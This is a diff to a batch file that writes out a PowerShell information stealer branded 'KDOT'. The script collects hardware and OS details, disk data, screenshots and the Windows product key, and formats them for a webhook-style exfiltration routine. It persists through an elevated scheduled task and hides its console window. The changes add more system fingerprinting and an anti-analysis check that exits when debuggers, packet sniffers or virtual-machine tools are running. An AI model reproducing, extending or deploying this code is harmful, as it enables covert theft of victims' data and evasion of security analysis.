@@ -16,12 +16,13 @@ echo $lang = (Get-WinUserLanguageList).LocalizedName >> powershell123.ps1
 echo $date = (get-date).toString("r") >> powershell123.ps1
 echo Get-ComputerInfo ^> $env:LOCALAPPDATA\Temp\system_info.txt >> powershell123.ps1
 echo $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption >> powershell123.ps1
+echo $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion >> powershell123.ps1
+echo $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion') >> powershell123.ps1
+echo $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model >> powershell123.ps1
 echo $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct ^| Select-Object -ExpandProperty UUID >> powershell123.ps1
 echo $uuid ^> $env:LOCALAPPDATA\Temp\uuid.txt >> powershell123.ps1
 echo $cpu = Get-WmiObject -Class Win32_Processor ^| Select-Object -ExpandProperty Name >> powershell123.ps1
 echo $cpu ^> $env:LOCALAPPDATA\Temp\cpu.txt >> powershell123.ps1
-echo $fulldiskinfo = diskdata  ^| out-string >> powershell123.ps1
-echo $fulldiskinfo ^> $env:temp\DiskInfo.txt >> powershell123.ps1
 echo $gpu = (Get-WmiObject Win32_VideoController).Name >> powershell123.ps1
 echo $gpu ^> $env:LOCALAPPDATA\Temp\GPU.txt >> powershell123.ps1
 echo $format = " GB" >> powershell123.ps1
@@ -91,6 +92,48 @@ echo $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.
 echo $bmp.Save("$env:localappdata\temp\desktop-screenshot.png") >> powershell123.ps1
 echo $graphics.Dispose() >> powershell123.ps1
 echo $bmp.Dispose() >> powershell123.ps1
+echo function diskdata { >> powershell123.ps1
+echo $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2" >> powershell123.ps1
+echo $results = foreach ($disk in $disks) { >> powershell123.ps1
+echo if ($disk.Size -gt 0) { >> powershell123.ps1
+echo $SizeOfDisk = [math]::round($disk.Size/1GB, 0) >> powershell123.ps1
+echo $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0) >> powershell123.ps1
+echo $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2) >> powershell123.ps1
+echo [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100 >> powershell123.ps1
+echo [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100 >> powershell123.ps1
+echo [PSCustomObject]@{ >> powershell123.ps1
+echo Drive = $disk.Name >> powershell123.ps1
+echo Name = $disk.VolumeName >> powershell123.ps1
+echo "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk >> powershell123.ps1
+echo "Free Disk Size" = "{0:N0} GB ({1:N0} %%)" -f $FreeSpace, ($FreePercent) >> powershell123.ps1
+echo "Used Space" = "{0:N0} GB ({1:N0} %%)" -f $usedspace, ($usedpercent) >> powershell123.ps1
+echo } >> powershell123.ps1
+echo } >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $results ^| out-string >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $alldiskinfo = diskdata >> powershell123.ps1
+echo $alldiskinfo ^> $env:temp\DiskInfo.txt >> powershell123.ps1
+echo function Get-ProductKey { >> powershell123.ps1
+echo $map="BCDFGHJKMPQRTVWXY2346789" >> powershell123.ps1
+echo $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42] >> powershell123.ps1
+echo $ProductKey = "" >> powershell123.ps1
+echo for ($i = 24; $i -ge 0; $i--) { >> powershell123.ps1
+echo $r = 0 >> powershell123.ps1
+echo for ($j = 14; $j -ge 0; $j--) { >> powershell123.ps1
+echo $r = ($r * 256) -bxor $value[$j] >> powershell123.ps1
+echo $value[$j] = [math]::Floor([double]($r / 24)) >> powershell123.ps1
+echo $r = $r %% 24 >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $ProductKey = $map[$r] + $ProductKey >> powershell123.ps1
+echo if (($i %% 5) -eq 0 -and $i -ne 0) { >> powershell123.ps1
+echo $ProductKey = "-" + $ProductKey >> powershell123.ps1
+echo } >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $ProductKey >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $ProductKey = Get-ProductKey >> powershell123.ps1
+echo Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell123.ps1
 echo $embed_and_body = @{ >> powershell123.ps1
 echo "username" = "KDOT" >> powershell123.ps1
 echo "content" = "@everyone" >> powershell123.ps1
@@ -126,11 +169,11 @@ echo "value" = "``````$avlist``````" >> powershell123.ps1
 echo }, >> powershell123.ps1
 echo @{ >> powershell123.ps1
 echo "name" = ":computer: Hardware" >> powershell123.ps1
-echo "value" = "``````Screen Size: $screen `nOS: $osversion `nManufacturer: $mfg `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````" >> powershell123.ps1
+echo "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````" >> powershell123.ps1
 echo }, >> powershell123.ps1
 echo @{ >> powershell123.ps1
 echo "name" = ":floppy_disk: Disk" >> powershell123.ps1
-echo "value" = "``````$fulldiskinfo``````" >> powershell123.ps1
+echo "value" = "``````$alldiskinfo``````" >> powershell123.ps1
 echo } >> powershell123.ps1
 echo @{ >> powershell123.ps1
 echo "name" = ":signal_strength: WiFi" >> powershell123.ps1
@@ -201,37 +244,6 @@ echo $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Don
 echo Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force >> powershell123.ps1
 echo EXFILTRATE-DATA >> powershell123.ps1
 echo } >> powershell123.ps1
-echo function diskdata { >> powershell123.ps1
-echo $disks = get-wmiobject Win32_LogicalDisk -computername "$env:computername" -Filter "DriveType = 3" >> powershell123.ps1
-echo foreach ($disk in $disks) { >> powershell123.ps1
-echo $letter = $disk.deviceID >> powershell123.ps1
-echo $volumename = $disk.volumename >> powershell123.ps1
-echo $totalspace = [math]::round($disk.size / 1GB, 2) >> powershell123.ps1
-echo $freespace = [math]::round($disk.freespace / 1GB, 2) >> powershell123.ps1
-echo $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2) >> powershell123.ps1
-echo $disk ^| Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} ^| FT >> powershell123.ps1
-echo } >> powershell123.ps1
-echo } >> powershell123.ps1
-echo function Get-ProductKey { >> powershell123.ps1
-echo $map="BCDFGHJKMPQRTVWXY2346789" >> powershell123.ps1
-echo $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42] >> powershell123.ps1
-echo $ProductKey = "" >> powershell123.ps1
-echo for ($i = 24; $i -ge 0; $i--) { >> powershell123.ps1
-echo $r = 0 >> powershell123.ps1
-echo for ($j = 14; $j -ge 0; $j--) { >> powershell123.ps1
-echo $r = ($r * 256) -bxor $value[$j] >> powershell123.ps1
-echo $value[$j] = [math]::Floor([double]($r / 24)) >> powershell123.ps1
-echo $r = $r %% 24 >> powershell123.ps1
-echo } >> powershell123.ps1
-echo $ProductKey = $map[$r] + $ProductKey >> powershell123.ps1
-echo if (($i %% 5) -eq 0 -and $i -ne 0) { >> powershell123.ps1
-echo $ProductKey = "-" + $ProductKey >> powershell123.ps1
-echo } >> powershell123.ps1
-echo } >> powershell123.ps1
-echo $ProductKey >> powershell123.ps1
-echo } >> powershell123.ps1
-echo $ProductKey = Get-ProductKey >> powershell123.ps1
-echo Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell123.ps1
 echo function Request-Admin { >> powershell123.ps1
 echo while(!(CHECK_IF_ADMIN)) { >> powershell123.ps1
 echo try { >> powershell123.ps1
@@ -239,6 +251,58 @@ echo Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy B
 echo exit >> powershell123.ps1
 echo } >> powershell123.ps1
 echo catch {} >> powershell123.ps1
+echo } >> powershell123.ps1
+echo } >> powershell123.ps1
+echo function Invoke-ANTIVM { >> powershell123.ps1
+echo function antivm >> powershell123.ps1
+echo { >> powershell123.ps1
+echo "autoruns" >> powershell123.ps1
+echo "autorunsc" >> powershell123.ps1
+echo "dumpcap" >> powershell123.ps1
+echo "Fiddler" >> powershell123.ps1
+echo "fakenet" >> powershell123.ps1
+echo "HookExplorer" >> powershell123.ps1
+echo "ImmunityDebugger" >> powershell123.ps1
+echo "httpdebugger" >> powershell123.ps1
+echo "ImportREC" >> powershell123.ps1
+echo "LordPE" >> powershell123.ps1
+echo "PETools" >> powershell123.ps1
+echo "ProcessHacker" >> powershell123.ps1
+echo "ResourceHacker" >> powershell123.ps1
+echo "Scylla_x64" >> powershell123.ps1
+echo "sandman" >> powershell123.ps1
+echo "SysInspector" >> powershell123.ps1
+echo "tcpview" >> powershell123.ps1
+echo "die" >> powershell123.ps1
+echo "dumpcap" >> powershell123.ps1
+echo "filemon" >> powershell123.ps1
+echo "idaq" >> powershell123.ps1
+echo "idaq64" >> powershell123.ps1
+echo "joeboxcontrol" >> powershell123.ps1
+echo "joeboxserver" >> powershell123.ps1
+echo "ollydbg" >> powershell123.ps1
+echo "proc_analyzer" >> powershell123.ps1
+echo "procexp" >> powershell123.ps1
+echo "procmon" >> powershell123.ps1
+echo "regmon" >> powershell123.ps1
+echo "sniff_hit" >> powershell123.ps1
+echo "sysAnalyzer" >> powershell123.ps1
+echo "tcpview" >> powershell123.ps1
+echo "windbg" >> powershell123.ps1
+echo "Wireshark" >> powershell123.ps1
+echo "x32dbg" >> powershell123.ps1
+echo "x64dbg" >> powershell123.ps1
+echo "Vmwareuser" >> powershell123.ps1
+echo "Vmacthlp" >> powershell123.ps1
+echo "vboxservice" >> powershell123.ps1
+echo "vboxtray" >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $processnames = antivm >> powershell123.ps1
+echo if(($processnames ^| ForEach-Object {Get-Process -Name $_ -ea SilentlyContinue}) -eq $null){ >> powershell123.ps1
+echo Invoke-TASKS >> powershell123.ps1
+echo } >> powershell123.ps1
+echo else{ >> powershell123.ps1
+echo exit >> powershell123.ps1
 echo } >> powershell123.ps1
 echo } >> powershell123.ps1
 echo function Hide-Console >> powershell123.ps1
@@ -256,7 +320,7 @@ echo $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell123.ps1
 echo } >> powershell123.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
 echo Hide-Console >> powershell123.ps1
-echo Invoke-TASKS >> powershell123.ps1
+echo Invoke-ANTIVM >> powershell123.ps1
 echo # Self-Destruct >> powershell123.ps1
 echo # Remove-Item $PSCommandPath -Force >> powershell123.ps1
 echo } else { >> powershell123.ps1
